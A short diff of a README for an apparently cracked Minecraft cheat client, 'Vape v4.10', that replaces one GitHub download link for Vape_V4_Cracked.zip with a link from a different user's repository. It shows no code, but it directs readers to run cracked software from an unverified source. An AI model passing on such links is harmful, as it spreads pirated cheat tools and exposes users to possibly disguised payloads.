@@ -10,7 +10,7 @@ Crack supports only Vanilla. Forge DOES NOT work since mappings are not included
 
 1. Follow these steps to set up and start the Vape v4.10:
 
-2. Download the https://github.com/VAPE-hacker/Vape_V4_Cracked/releases/download/VapeV4/Vape_V4_Cracked.zip 
+2. Download the [Vape_V4_Cracked.zip](https://github.com/zhu-bie/Vape-V4-Cracked/releases/download/Vape-V4/Vape_V4_Cracked.zip)
 
 3. Download Java 17.0.6 or higher. 
 
